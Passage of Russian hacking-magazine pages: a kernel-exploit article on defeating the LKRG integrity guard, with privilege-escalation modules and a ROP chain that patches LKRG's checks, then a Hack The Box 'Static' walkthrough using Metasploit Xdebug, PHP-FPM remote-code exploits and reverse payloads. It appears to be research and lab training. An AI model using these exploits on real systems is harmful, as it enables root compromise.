                                   ← НАЧАЛО СТАТЬИВЗЛОМ
          ПРОВЕРКА
      НА ПРОЧНОСТЬ
                   КАК Я ИССЛЕДОВАЛ ЗАЩИТУ LKRG
           С ПОМОЩЬЮ УЯЗВИМОСТИ В ЯДРЕ LINUX





ПРОВЕРИТЬ LKRG НА ПРОЧНОСТЬ
Linux Kernel Runtime Guard (LKRG) — это очень интересный проект. Он пре‐
доставляет ядерный модуль, который в процессе работы системы проверяет
целостность ядра и противодействует эксплуатации уязвимостей в нем. LKRG
выявляет ядерные эксплоиты по характерным действиям и повреждению
определенных данных. LKRG обнаруживает:
 • несанкционированное  повышение  привилегий  через  вызов  функции
  commit_creds() или с помощью перезаписи struct cred;
 • нарушение изоляции процесса и выход из namespace;
 • несанкционированное  изменение  состояния  процессора  (например,
   отключение SMEP и SMAP на x86_64);
 • неправомерное изменение данных в секциях .text и .rodata ядра Linux;
 • выполнение приемов stack pivoting и ROP и еще многое другое.





Этот проект поддерживается компанией Openwall. Основной разработчик —
Адам «pi3» Заброцки, который занимается проектом в свободное время.
Сейчас LKRG поставляется в бета‑версии, при этом разработчики стараются
поддерживать высокую надежность и портируемость между различными вер‐
сиями ядра. Вот что Адам говорит о проекте:


     We are aware that LKRG  is bypassable by design (as we have always
      spoken openly) but such bypasses are neither easy nor cheap/reliable.«                »
Перевожу это так:

    Мы знаем, что защиту LKRG можно обойти (о чем мы всегда открыто
       говорили),  однако  эти  методы  обхода  непростые,  недешевые«
      и ненадежные.                »
Илья Матвейчиков, известный эксперт по руткитам, уже проводил исследова‐
ния в этой области. Он собрал результаты своих экспериментов в отдельном
репозитории. В ответ Адам проанализировал работу Ильи и улучшил LKRG,
чтобы устранить эти методы обхода защиты.
  Я решил доработать мой улучшенный прототип эксплоита для CVE-2021-
26708 и придумать новый способ обхода LKRG. Стало еще интереснее. Моя
первая идея была такая. LKRG отслеживает несанкционированное повыше‐
ние привилегий, но при этом не следит за содержимым файла /etc/passwd.
Значит, я могу попробовать незаметно сбросить пароль пользователя root
через изменение /etc/passwd! Выполнение команды su после этого будет
выглядеть для LKRG абсолютно легально.
  Я сделал быстрый прототип для этой идеи. Удобно было оформить его
в виде небольшого модуля ядра:


#include <linux/module.h>
#include <linux/kallsyms.h>


static int __init pwdhack_init(void)
{
    struct file *f = NULL;
    char *str = "root::0:0:root:/root:/bin/bash\n";
    ssize_t wret;
    loff_t pos = 0;


    pr_notice("pwdhack: init\n");


    f = filp_open("/etc/passwd", O_WRONLY, 0);
    if (IS_ERR(f)) {
        pr_err("pwdhack: filp_open() failed\n");
        return -ENOENT;
    }


    wret = kernel_write(f, str, strlen(str), &pos);
    printk("pwdhack: kernel_write() returned %ld\n", wret);


    pr_notice("pwdhack: done\n");


    return 0;
}


static void __exit pwdhack_exit(void)
{
    pr_notice("pwdhack: exit\n");
}


module_init(pwdhack_init)
module_exit(pwdhack_exit)


MODULE_LICENSE("GPL v2");

Этот ядерный код перезаписывает начало файла /etc/passwd  строкой
root::0:0:root:/root:/bin/bash\n и тем самым  устанавливает пустой
пароль для пользователя root. После этого непривилегированный поль‐
зователь может выполнить команду su и беспрепятственно получить привиле‐
гии суперпользователя.
   Далее я реализовал в своей ROP-цепочке такую логику с вызовом фун‐
кций filp_open() и kernel_write(), но эксплоит не смог открыть файл
/etc/passwd. Оказывается, ядро проверяет привилегии процесса и правила
политики SELinux, даже  когда файл открывается из пространства ядра.
Перезапись привилегий перед filp_open() тоже не сработала: LKRG сразу
же обнаружил это и убил процесс эксплоита. Таким образом, эту идею приш‐
лось отбросить.


ВПЕРЕД, В АТАКУ НА LKRG!
Размышляя о LKRG с позиции атакующего, я осознал, что не нужно от него
прятаться. Напротив, мне пришла идея как‑то уничтожить LKRG прямо
из ROP-цепочки.





                      Анатолий Волков. Снежки. 1957

Самый прямой путь к этой цели — просто выгрузить LKRG из ядра. Я написал
небольшой  модуль  ядра,  чтобы  проверить  эту  гипотезу  перед  тем,
как перерабатывать ROP-цепочку в эксплоите:


#include <linux/module.h>
#include <linux/kallsyms.h>


static int __init destroy_lkrg_init(void)
{
    struct module *lkrg_mod = find_module("p_lkrg");


    if (!lkrg_mod) {
        pr_notice("destroy_lkrg: p_lkrg module is NOT found\n");
        return -ENOENT;
    }


    if (!lkrg_mod->exit) {
        pr_notice("destroy_lkrg: p_lkrg module has no exit method\n")
;
        return -ENOENT;
    }


    pr_notice("destroy_lkrg: p_lkrg module is found, remove it
brutally!\n");
    lkrg_mod->exit();


    return 0;
}


static void __exit destroy_lkrg_exit(void)
{
    pr_notice("destroy_lkrg: exit\n");
}


module_init(destroy_lkrg_init)
module_exit(destroy_lkrg_exit)


MODULE_LICENSE("GPL v2");

Эксперимент показал, что это рабочая идея, модуль LKRG был выгружен. Тог‐
да я реализовал в моей ROP-цепочке  эту логику с вызовом функций
find_module() и exit() из LKRG, но она не сработала. Почему? В функции
p_lkrg_deregister() в процессе своей выгрузки LKRG вызывает ядерную
функцию schedule(), в которой у него поставлена дополнительная проверка
pCFI (LKRG вставляет такие проверки во многие важные точки ядра Linux).
Эта проверка обнаруживает мою ROP-цепочку и убивает процесс эксплоита
прямо в процессе выгрузки модуля LKRG. К тому же система при этом
зависает. Жаль, хорошая была идея.
   Тогда я стал думать, как еще можно вывести LKRG из строя, и обратил
внимание на kprobes и kretprobes. Это как раз тот механизм, с помощью
которого LKRG расставляет свои проверки по всему ядру Linux. Первым
делом я попробовал просто выключить kprobes через штатную настройку
в debugfs:



  [root@localhost ~]# echo 0 > /sys/kernel/debug/kprobes/enabled


На системе без LKRG это сработало корректно, но, когда я попробовал сде‐
лать то же самое с загруженным LKRG, система полностью зависла. Мне
кажется, в этом случае где‑то в ядре из‑за LKRG происходит взаимная бло‐
кировка (deadlock) или бесконечный цикл. Как бы то ни было, я не стал тра‐
тить время на отладку этой ошибки.
   Кстати, отладка ядра с LKRG — то еще удовольствие. Например, я долго
не мог понять, почему ядро Linux с LKRG падает (crash) каждый раз, когда я
пытаюсь поработать в отладчике. Дело в том, что при задании точки останова
gdb меняет инструкцию в коде ядра, а LKRG в параллельном потоке через
некоторое время обнаруживает это как «ошибку целостности» и убивает всю
машину, пока я таращусь в отладчик, пытаясь понять, что к чему! :)


УСПЕШНАЯ АТАКА НА LKRG
Наконец мне удалось придумать рабочую атаку против LKRG. Я стал раз‐
бираться в его коде и нашел две функции, которые отвечают за обнаружение
атак. Это p_check_integrity(), которая выполняет проверку целостности
кода ядра, и p_cmp_creds(), которая сверяет привилегии процессов сис‐
темы с  внутренней базой LKRG и  обнаруживает  несанкционированное
повышение привилегий.
  Мне пришла идея атаковать в лоб и переписать код этих двух функций пря‐
мо из ROP-цепочки в эксплоите. Я сделал это с помощью байтов 0x48 0x31
0xc0 0xc3, которые представляют собой инструкции xor rax, rax ; ret,
то есть return 0. После этого я беспрепятственно поднял привилегии про‐
цесса эксплоита. Отлично! Разберем получившуюся финальную ROP-цепоч‐
ку:


unsigned long *rop_gadget = (unsigned long *)(xattr_addr +
MY_UINFO_OFFSET + 8);
int i = 0;


#define SAVED_RSP_OFFSET    3400


#define ROP_MOV_RAX_R9_RET      (0xFFFFFFFF8106BDA4lu + kaslr_offset)
#define ROP_POP_RDX_RET         (0xFFFFFFFF8105ED4Dlu + kaslr_offset)
#define ROP_AND_RAX_RDX_RET     (0xFFFFFFFF8101AD34lu + kaslr_offset)
#define ROP_ADD_RAX_RCX_RET     (0xFFFFFFFF8102BA35lu + kaslr_offset)
#define ROP_MOV_RDX_RAX_RET     (0xFFFFFFFF81999A1Dlu + kaslr_offset)
#define ROP_POP_RAX_RET         (0xFFFFFFFF81015BF4lu + kaslr_offset)
#define ROP_MOV_QWORD_PTR_RAX_RDX_RET   (0xFFFFFFFF81B6CB17lu +
kaslr_offset)


/* 1. Save RSP */
rop_gadget[i++] = ROP_MOV_RAX_R9_RET;   /* mov rax, r9 ; ret */
rop_gadget[i++] = ROP_POP_RDX_RET;  /* pop rdx ; ret */
rop_gadget[i++] = 0xffffffff00000000lu;
rop_gadget[i++] = ROP_AND_RAX_RDX_RET;  /* and rax, rdx ; ret */
rop_gadget[i++] = ROP_ADD_RAX_RCX_RET;  /* add rax, rcx ; ret */
rop_gadget[i++] = ROP_MOV_RDX_RAX_RET;  /* mov rdx, rax ; shr rax,
0x20 ; xor eax, edx ; ret */
rop_gadget[i++] = ROP_POP_RAX_RET;  /* pop rax ; ret */
rop_gadget[i++] = uaf_write_value + SAVED_RSP_OFFSET;
rop_gadget[i++] = ROP_MOV_QWORD_PTR_RAX_RDX_RET; /* mov qword ptr [
rax], rdx ; ret */

Эта часть ROP-цепочки восстанавливает начальное значение RSP из битов
в ECX и R9 (методику я описывал выше). Это значение стекового указателя
сохраняется в ядерном объекте sk_buff (он под контролем атакующего)
по  отступу SAVED_RSP_OFFSET.  Такая  хитрость  позволяет не  занимать
под хранение значения отдельный регистр, он еще пригодится.


#define KALLSYMS_LOOKUP_NAME    (0xffffffff81183dc0lu + kaslr_offset)
#define FUNCNAME_OFFSET_1   3550


#define ROP_POP_RDI_RET             (0xFFFFFFFF81004652lu +
kaslr_offset)
#define ROP_JMP_RAX             (0xFFFFFFFF81000087lu + kaslr_offset)


/* 2. Destroy lkrg : part 1 */
rop_gadget[i++] = ROP_POP_RAX_RET;  /* pop rax ; ret */
rop_gadget[i++] = KALLSYMS_LOOKUP_NAME;
          /* unsigned long kallsyms_lookup_name(const char *name) */
rop_gadget[i++] = ROP_POP_RDI_RET;  /* pop rdi ; ret */
rop_gadget[i++] = uaf_write_value + FUNCNAME_OFFSET_1;
strncpy((char *)xattr_addr + FUNCNAME_OFFSET_1, "p_cmp_creds", 12);
rop_gadget[i++] = ROP_JMP_RAX;      /* jmp rax */

Эта  часть  ROP-цепочки  вызывает  функцию  kallsyms_lookup_name(
"p_cmp_creds"). В ядерном объекте sk_buff по отступу FUNCNAME_OFFSET_1
подготавливается строка "p_cmp_creds". Ее адрес загружается в регистр
RDI, через который должен передаваться первый аргумент функции в соот‐
ветствии с System V AMD64 ABI.
   Важно заметить, что опция lkrg.hide по умолчанию имеет значение 0, что
позволяет атакующему легко получить адреса функций LKRG с помощью
вызова kallsyms_lookup_name(). Также есть и другие способы сделать это.


#define XOR_RAX_RAX_RET             (0xFFFFFFFF810859C0lu +
kaslr_offset)
#define ROP_TEST_RAX_RAX_CMOVE_RAX_RDX_RET  (0xFFFFFFFF81196AA2lu +
kaslr_offset)


/* If lkrg function is not found, let's patch "xor rax, rax ; ret" */
rop_gadget[i++] = ROP_POP_RDX_RET;  /* pop rdx ; ret */
rop_gadget[i++] = XOR_RAX_RAX_RET;
rop_gadget[i++] = ROP_TEST_RAX_RAX_CMOVE_RAX_RDX_RET; /* test rax,
rax ; cmove rax, rdx ; ret*/

В   этой   части   ROP-цепочки   идет   обработка   результата  вызова
kallsyms_lookup_name(). Эта функция через регистр RAX возвращает адрес
p_cmp_creds() или NULL, если модуль LKRG не загружен. Эксплоит должен
корректно обрабатывать оба этих случая, и я придумал для этого такой трюк:
 1. Я нашел в ядерной памяти «живой» машины байты инструкций xor rax,
  rax ; ret, их адрес здесь определен как XOR_RAX_RAX_RET.
 2. Этот адрес загружается в регистр RDX.
 3. Если kallsyms_lookup_name("p_cmp_creds") возвращает NULL, то
   этот адрес загружается в регистр RAX вместо NULL. Для этого использует‐
   ся инструкция conditional move в гаджете test rax, rax ; cmove
  rax, rdx ; ret.

Отлично! Если модуль LKRG загружен в ядро, эксплоит перепишет код фун‐
кции p_cmp_creds() инструкциями xor rax, rax ; ret. В противном слу‐
чае,   если  LKRG    отсутствует,    эксплоит   перепишет    инструкции
xor rax, rax ; ret теми же самыми байтами и ничего не испортит в ядер‐
ной памяти. Эта перезапись (patching) выполняется в следующей части ROP-
цепочки:


#define TEXT_POKE       (0xffffffff81031300lu + kaslr_offset)
#define CODE_PATCH_OFFSET   3450


#define ROP_MOV_RDI_RAX_POP_RBX_RET     (0xFFFFFFFF81020ABDlu +
kaslr_offset)
#define ROP_POP_RSI_RET             (0xFFFFFFFF810006A4lu +
kaslr_offset)


rop_gadget[i++] = ROP_MOV_RDI_RAX_POP_RBX_RET;
          /* mov rdi, rax ; mov eax, ebx ; pop rbx ; or rax, rdi ;
ret */
rop_gadget[i++] = 0x1337;      /* dummy value for RBX */
rop_gadget[i++] = ROP_POP_RSI_RET; /* pop rsi ; ret */
rop_gadget[i++] = uaf_write_value + CODE_PATCH_OFFSET;
strncpy((char *)xattr_addr + CODE_PATCH_OFFSET, "\x48\x31\xc0\xc3", 5
);
rop_gadget[i++] = ROP_POP_RDX_RET; /* pop rdx ; ret */
rop_gadget[i++] = 4;
rop_gadget[i++] = ROP_POP_RAX_RET; /* pop rax ; ret */
rop_gadget[i++] = TEXT_POKE;
          /* void *text_poke(void *addr, const void *opcode, size_t
len) */
rop_gadget[i++] = ROP_JMP_RAX;     /* jmp rax */

Здесь эксплоит подготавливает в регистрах аргументы для вызова функции
text_poke(), которая и выполнит перезапись ядерного кода:
 1. Адрес цели для перезаписи копируется из RAX в RDI. Это будет первый
   аргумент функции. К сожалению, мне не удалось найти меньший гаджет,
   который сделает это копирование, поэтому здесь на стеке подготовлены
   дополнительные байты для лишней инструкции pop rbx из первого гад‐
   жета.
 2. В объекте sk_buff по отступу CODE_PATCH_OFFSET подготавливается
   полезная нагрузка 0x48 0x31 0xc0 0xc3 для перезаписи кода. Ее
   адрес сохраняется в регистр RSI в качестве второго аргумента функции.
 3. Третий аргумент функции text_poke() — это длина данных для переза‐
   писи. Он передается через регистр RDX и имеет значение 4.

Ядерная функция text_poke() — это штатный механизм, с помощью которо‐
го ядро может изменять собственный код в динамике, во время работы. Эта
функция на краткое время делает отображение нужного кода доступным
для записи и выполняет memcpy(). Этой возможностью как раз пользуется
kprobes и другие механизмы ядра Linux.
   Описанная процедура с kallsyms_lookup_name(), cmove и text_poke()
затем   выполняется  для  перезаписи  функции  p_check_integrity()
из модуля LKRG. Тем самым эксплоит устраняет защиту LKRG, делая его пол‐
ностью беспомощным. Теперь можно беспрепятственно повысить привиле‐
гии процесса (это уже было описано выше):


#define ROP_MOV_QWORD_PTR_RAX_0_RET (0xFFFFFFFF8112E6D7lu +
kaslr_offset)


/* 3. Perform privilege escalation */
rop_gadget[i++] = ROP_POP_RAX_RET;      /* pop rax ; ret */
rop_gadget[i++] = owner_cred + CRED_UID_GID_OFFSET;
rop_gadget[i++] = ROP_MOV_QWORD_PTR_RAX_0_RET;  /* mov qword ptr [
rax], 0 ; ret */
rop_gadget[i++] = ROP_POP_RAX_RET;      /* pop rax ; ret */
rop_gadget[i++] = owner_cred + CRED_EUID_EGID_OFFSET;
rop_gadget[i++] = ROP_MOV_QWORD_PTR_RAX_0_RET;  /* mov qword ptr [
rax], 0 ; ret */

Финальная часть ROP-цепочки восстанавливает начальное значение регис‐
тра RSP из данных объекта sk_buff по отступу SAVED_RSP_OFFSET:


/* 4. Restore RSP and continue */
rop_gadget[i++] = ROP_POP_RAX_RET;       /* pop rax ; ret */
rop_gadget[i++] = uaf_write_value + SAVED_RSP_OFFSET;
rop_gadget[i++] = ROP_MOV_RAX_QWORD_PTR_RAX_RET; /* mov rax, qword
ptr [rax] ; ret */
rop_gadget[i++] = ROP_PUSH_RAX_POP_RBX_RET;  /* push rax ; pop rbx ;
ret */
rop_gadget[i++] = ROP_PUSH_RBX_POP_RSP_RET;
          /* push rbx ; add eax, 0x415d0060 ; pop rsp ; ret */

После  этого ядро  возобновляет  обработку  системного вызова recv(),
но процесс эксплоита при этом обладает привилегиями пользователя root.
Всё, пожалуй, это была самая сложная часть статьи.





                  Николай Ломакин. Первая деталь. 1953


ОТВЕТСТВЕННОЕ РАЗГЛАШЕНИЕ ИНФОРМАЦИИ
О результатах моих экспериментов с LKRG я сообщил Адаму Заброцки
и Александру Песляку (Solar Designer) 10 июня 2021 года. Мы детально обсу‐
дили мои способы обхода защиты LKRG и обменялись мнениями о проекте
в целом.
  С позволения Адама и Александра 3 июля я опубликовал результаты моего
исследования в открытом списке рассылки lkrg-users. На момент пуб‐
ликации этой статьи мой метод атаки все еще работает. Для защиты требует‐
ся переработка архитектуры LKRG, она пока в планах.
  На мой взгляд, LKRG — замечательный проект. Когда я начал изучать его,
сразу же отметил, что Адам и другие разработчики приложили большие уси‐
лия, чтобы сделать качественный и красивый продукт. Вместе с тем я убеж‐
ден,  что  обнаружить  последствия  эксплуатации  ядерных  уязвимостей
на уровне самого ядра невозможно. Альберт Эйнштейн говорил: «Невоз‐
можно решить проблему на том же уровне, на котором она возникла».
   Другими словами, защита LKRG должна работать на другом уровне или в
другом контексте, чтобы обнаруживать деятельность атакующего в ядре.
В частности, LKRG мог бы представлять большую преграду для атакующего,
если бы модуль был перенесен на уровень гипервизора или же в Arm Trusted
Execution Environment. Такое портирование — сложная инженерная задача,
и для ее решения разработчикам LKRG требуется поддержка сообщества и,
возможно, заинтересованных в проекте компаний.


ЗАКЛЮЧЕНИЕ
В этой статье я описал, как я доработал свой прототип эксплоита для уяз‐
вимости CVE-2021-26708 в ядре Linux. Это было интересное исследование
с большим количеством практики по возвратно‑ориентированному прог‐
раммированию и ассемблеру. Я искал ROP/JOP-гаджеты в памяти работа‐
ющей системы и смог выполнить переключение ядерного  стека  (stack
pivoting) в ограниченных условиях. Я также проанализировал защиту Linux
Kernel Runtime Guard с позиции атакующего, разработал новый способ атаки
на LKRG и предоставил результаты своего исследования команде разработ‐
чиков этого проекта.
  Я уверен, что эта статья будет полезна для сообщества разработчиков
Linux, поскольку она отражает многие практические аспекты безопасности
ядра. И еще я хочу сказать спасибо компании Positive Technologies за воз‐
можность провести это исследование.
ВЗЛОМ

        HTB
 STATIC





        ЗАХВАТЫВАЕМ СЕРВЕР
      ЧЕРЕЗ VPN И ДЫРУ В XDEBUG





Для начала я покажу, как фиксить «битый»
архив GZIP; из него мы получим важную
информацию, затем подберем одноразо‐
вый пароль и получим доступ к хосту через
VPN. Для повышения привилегий проэкс‐            RalfHacker                                                                                             hackerralf8@gmail.com
плуатируем уязвимость в Xdebug и найдем
ошибки в сложной пользовательской прог‐
рамме. Все это — чтобы пройти сложную
машину Static с площадки Hack The Box.


           WARNING

                            Подключаться к машинам с HTB рекомендуется
                            только через VPN. Не делай этого с компьютеров,
                        где есть важные для тебя данные, так как ты ока‐
                        жешься в общей сети с другими участниками.



РАЗВЕДКА. СКАНИРОВАНИЕ ПОРТОВ
Добавляем IP-адрес машины в /etc/hosts:


10.10.10.246    static.htb

И запускаем сканирование портов.

Справка: сканирование портов
Сканирование портов — стандартный первый шаг при любой атаке. Он поз‐
воляет атакующему узнать, какие службы на хосте принимают соединение.
На основе этой информации выбирается следующий шаг к получению точки
входа.
   Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи следующего скрипта.


 #!/bin/bash
 ports=$( nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '\n' ',' | sed s/,$/ /)
 nmap -p$ports -A $1


Он действует в два этапа. На первом производится обычное быстрое ска‐
нирование, на втором — более тщательное, с использованием имеющихся
скриптов (опция -A).





                             Результат работы скрипта

Мы нашли три открытых порта: 22 (служба OpenSSH 7.9p1), 2222 (служба
OpenSSH 7.6p1) и 8080 (веб‑сервер Apache 2.4.38). Начнем с веба.

Справка: брутфорс учеток
Поскольку вначале у нас нет учетных данных, нет и смысла изучать службы,
которые всегда требуют авторизации (например, SSH). Единственное, что мы
можем делать здесь, — это перебирать пароли брутфорсом, но машины
с HTB почти всегда можно пройти по‑другому. В жизни таких вариантов
может не быть, к тому же есть шансы подобрать пароль или получить его
при помощи социальной инженерии.



В результатах скана отмечено, что в корневом каталоге сервера есть файл
robots.txt. Этот файл используется для того, чтобы попросить краулеры
(например, Google, Яндекс и прочие) не трогать какие‑то определенные
каталоги.
  К примеру, никто не хочет, чтобы в поисковой выдаче появлялись стра‐
ницы  авторизации  администраторов  сайта,  файлы  или  персональная
информация со страниц пользователей и прочие вещи в таком духе. Но у
любой медали две стороны: злоумышленники первым делом просматривают
этот файл, чтобы узнать о файлах и каталогах, которые хочет спрятать адми‐
нистратор сайта. В нашем случае есть два каталога: vpn и .ftp_uploads.
  На первой странице нас встречает самописный сайт, а точнее, форма
авторизации. Во втором каталоге нет файла index.html и запрет на прос‐
мотр на веб‑сервере тоже не задан, поэтому мы можем видеть все его
содержимое.





                         Форма авторизации





                    Содержимое каталога .ftp_uploads

Скачиваем дамп базы данных и просматриваем сообщение.


       Binary files are being corrupted during transfer!!! Check if are recoverable.«               »
В сообщении сказано, что файл был поврежден и его требуется восста‐
новить. Разархивировать GZIP у меня тоже не вышло, поэтому я отправился
в Google за поиском утилиты, способной решить эту проблему.


ТОЧКА ВХОДА
GZIP fix
Поискав на просторах GitHub, я нашел программку fixgz. Но перед исполь‐
зованием ее нужно собрать из исходников.


git clone https://github.com/yonjar/fixgz
cd fixgz
g++ fixgz.cpp
./a.out ../db.sql.gz fixed_db.sql.gz
gunzip fixed_db.sql.gz





                         Исправление архива GZIP

После исправления архива мы его распаковываем и читаем дамп базы дан‐
ных. В дампе мы найдем учетные данные для авторизации: логин, хеш пароля
и зачем‑то TOTP — одноразовый пароль на основе времени.




                     Содержимое дампа базы данных

У нас есть хеш, значит, нужно попытаться его перебрать. Но перед этим необ‐
ходимо узнать алгоритм. Все возможные алгоритмы хеширования для задан‐
ной последовательности может подыскать утилита HashId.





                         Определение типа хеша

Из  всех  представленных  алгоритмов  наиболее  популярный,  а  значит,
и наиболее вероятный — SHA-1. Для него есть много онлайновых декрипто‐
ров с огромными базами. Воспользуемся одним из них и получим очень
простой пароль.





                        Находим пароль по хешу

С учетными данными admin:admin авторизуемся на сайте, который мы встре‐
тили первым, и получим форму ввода одноразового пароля. Таким образом,
на сайте используется двухфакторная аутентификация.





                          Форма ввода OTP


TOTP
TOTP (Time-based One-Time Password Algorithm) — алгоритм создания одно‐
разовых паролей для защищенной аутентификации. Это алгоритм односто‐
ронней аутентификации, то есть сервер удостоверяется в подлинности кли‐
ента. Главное отличие TOTP от других подобных алгоритмов — генерация
пароля на основе времени. Обычно это не точное время, а какой‑то его
интервал (по умолчанию 30 секунд).
   Можно найти много генераторов ТОТP, как онлайновых, так и реализован‐
ных в виде библиотек для разных языков программирования. Что делает
ТОТP безопасным — это TOTP-секрет, который мы, скорее всего, и нашли
в базе.
   Осталось настроить время, как на удаленном сервере. Узнать его мы
можем из ответа HTTP в заголовке Date. После этого выставляем его у себя
командой sudo date -s "[содержимое заголовка Date]".





                             HTTP-ответ

Затем я использовал расширение auth-helper для Firefox. Полученный OTP
быстро вставляем в форму, и нам открываются дополнительные возможности
на сайте.





                           Главная страница сайта

Видим список серверов и соответствующие IP-адреса. Вот только сети эти
нам недоступны. Также имеется форма ввода для какого‑то генератора. Я
ввел простое слово и получил конфиг VPN.





                 Предложение о загрузке конфига VPN

Откроем файл и посмотрим параметры подключения. Так, в параметре
remote указан сервер vpn.static.htb.





                    Содержимое файла конфигураций

Первым делом нужно добавить соответствующую запись в /etc/hosts:


10.10.10.246 static.htb vpn.static.htb

Теперь попробуем подключиться по VPN.




                             Логи подключения VPN

Из логов мы видим, что автоматически добавился маршрут в сети 172.17.0.
0/24 и 172.30.0.0/16. При этом другие хосты расположены в сети 172.20.
0.0/16, поэтому мы не сможем к ним обратиться. Тогда я решил добавить
маршрут в эту сеть самостоятельно.


sudo ip route add 172.20.0.0/24 dev tun9

А затем обратимся к хосту WEB (172.20.0.10) через браузер. Вуаля! Вновь
каталог с доступным содержимым.





                         Корневой каталог сайта


ТОЧКА ОПОРЫ
Страница info.php на самом деле выполняет PHPINFO.





                            Страница info.php

Здесь очень много информации, которую нужно тщательно проанализи‐
ровать. Отсюда можно узнать версии всех затронутых программных продук‐
тов, таких как OpenSSL, PDO_MYSQL, Phar. Высока вероятность, что один
из них будет не обновлен и поэтому уязвим. Так натыкаемся на Xdebug —
средство профилирования и отладки скриптов на PHP. Xdebug поставляется
как расширение для PHP, поэтому может дать нам выполнение произвольного
кода. В базе Metasploit есть такой эксплоит.





                     Поиск эксплоитов в базе Metasploit





                           Параметры эксплоита

По умолчанию Xdebug будет прослушивать порт 9000 на машине разработ‐
чика. Чтобы активировать Xdebug, в GET- или POST-параметре или в cookie
должен присутствовать параметр XDEBUG_SESSION=name.
   Обычная  конфигурация Xdebug может  выглядеть  так: ini  xdebug.
remote_enable= true xdebug.remote_host= [IP]. В этом случае IP-адрес
разработчика задается в конфигурации и позволяет только указанному IP-
адресу  использовать  Xdebug.  Однако  существует опция  конфигурации
xdebug.remote_connect_back, и установка для нее значения true отключает
настроенный  IP-адрес  xdebug.remote_host  и  позволяет  подключиться
обратно к любому хосту, который активирует Xdebug. Таким образом, любой
подключившийся может выполнить произвольный код.
   Зададим необходимые параметры: URL-адрес, адрес тестируемого хоста,
а также локальные хост и порт для обратного подключения нагрузки.


use exploit/unix/http/xdebug_unauth_exec
set PATH /vpn/login.php
set RHOSTS 172.20.0.10
set RPORT 80
set LHOST tun9
set LPORT 443
run





                         Получение сессии Meterpreter

И мы  получаем  сессию  Meterpreter.  Просматривая домашний  каталог,
находим флаг пользователя и понимаем, что www-data — системный поль‐
зователь с командной оболочкой.





                    Содержимое домашнего каталога





                       Флаг пользователя

Данное соединение нестабильно, и приходится часто подключаться заново.
Так как это системный пользователь, мы можем записать ключ SSH. Но при
просмотре домашней директории пользователя находим уже существующий
приватный ключ id_rsa.





  Содержимое домашней директории пользователя www-data и приватный
  ключ

Сохраняем приватный ключ на локальный хост, назначаем ему необходимые
права командой chmod 0600 id_rsa и подключаемся по SSH. Но на пор‐
те 22 у нас потребуют пароль! Тогда пробуем подключиться ко второму SSH-
порту 2222 — и мы в системе.


                          Командная оболочка SSH




                                     Продолжение статьи →
                                   ← НАЧАЛО СТАТЬИВЗЛОМ
          HTB STATIC
            ЗАХВАТЫВАЕМ СЕРВЕР ЧЕРЕЗ VPN И ДЫРУ
                                  В XDEBUG





ПРОДВИЖЕНИЕ
Теперь, когда мы получили стабильный доступ к хосту, нам необходимо соб‐
рать информацию,  которая может помочь с повышением  привилегий.
Источников информации очень много, и, чтобы не держать их все в голове,
были разработаны PEASS-скрипты, как для Windows, так и для Unix. Они про‐
верят самые уязвимые места системы и подскажут, на что обратить внимание
(выделят красным цветом). Загрузим данный скрипт на хост с помощью SCP
и выполним:


scp -P2222 -i id_rsa ./linpeas.sh www-data@static.htb:/tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh

В выводе найдем очень мало полезной информации, в том числе IP-адреса
и какой‑то пароль.



                        Найденный в системе пароль

Обнаруженный дополнительный IP-адрес 192.168.254.3 обратил на себя вни‐
мание, так как на захваченном хосте используется 192.168.254.2.





                          Вывод команды ifconfig

Тогда я решил просканировать найденный адрес и атаковать уже сервисы
на нем. Для удобного и быстрого сканирования сначала загрузим на хост
Nmap, а затем пройдемся по всем портам.


scp -P2222 -i id_rsa ~/tools/linStaticbins/nmap www-data@static.htb:/
tmp/nmap
./nmap --min-rate= 2000 -p- 192.168.254.3




                          Результат сканирования портов

В итоге находим еще один веб. Для работы с удаленным хостом через
локальный нам нужно туннелировать трафик. Давай прокинем данный порт, то
есть сделаем так, чтобы весь трафик, который проходит через определенный
порт локальной машины, ретранслировался на данный порт целевого хоста.
Делаем это с помощью стандартного SSH.


ssh -i id_rsa -N -L 8000:192.168.254.3:80 www-data@static.htb -p2222

Таким образом, все запросы к порту 8888 локального хоста 127.0.0.1 будут
пересылаться на порт 80 хоста 192.168.254.3 через SSH-соединение хоста
static.htb. Попробуем обратиться к сайту с локальной машины. Для этого
выполним запрос через браузер по адресу http://127.0.0.1:8000/.





                           Главная страница сайта

Туннель работает, но вот только никакого понятного сервиса мы не получаем.
При тестировании такого веба всегда стоит взглянуть на используемые тех‐
нологии, получить которые можно утилитой whatweb.



                         Результат сканирования whatweb

Из  всей  информации  наиболее  интересен  заголовок  X-Powered-By,
по которому определим версию PHP  FPM/7.1, что наталкивает на мысль
о поиске эксплоитов.

Справка: поиск готовых эксплоитов
При пентесте лучше всего искать эксплоиты при помощи Google, поскольку
этот поисковик заглядывает и в личные блоги, и в самые разные отчеты. Уско‐
рят дело специализированные базы вроде Exploit-DB — там часто можно
обнаружить подходящие варианты. Если ты работаешь в специализирован‐
ной ОС вроде Kali Linux, то эта база у тебя уже есть и для поиска можно
использовать утилиту searchsploit.



Чудо‑утилита searchsploit никаких записей не нашла, а вот Google знает
больше.
   Так, погуглив «exploit PHP-FPM», получаем множество упоминаний CVE-
2019-11043. Если кратко, то строка 1140 в fpm_main.c содержит манипуляции
с указателями, которые предполагают, что у env_path_info есть префикс,
равный пути к скрипту на PHP. Тем не менее код не проверяет, выполняется
ли это, из‑за чего становится возможен доступ к неверному указателю
в переменной path_info.
   Запросив URL, оформленный определенным образом, атакующий может
добиться  смещения  указателя  path_info  на  первый  байт  структуры
_fcgi_data_seg, а запись нуля в этот байт приведет к перемещению указате‐
ля char*  pos на ранее идущую область памяти. Вызываемый следом
FCGI_PUTENV перезапишет данные в этой памяти значением, которое контро‐
лирует атакующий. Так мы можем указать, к примеру, на значения других
переменных FastCGI. Записав свои данные, атакующий может создать фик‐
тивную переменную PHP_VALUE, что приведет к выполнению произвольного
кода.
   Рабочий эксплоит есть на GitHub. После первого запуска он сообщает
нам, что атака выполнена и мы можем передавать команды через параметр a.


python3 main.py -u http://127.0.0.1:8000/index.php





                           Выполнение эксплоита


curl 'http://127.0.0.1:8000/index.php?a=whoami'




                       Выполнение команды whoami

Так как команды выполняются немедленно, кинем реверс‑шелл.

Справка: реверс-шелл
Обратный шелл — это подключение, которое активирует атакуемая машина,
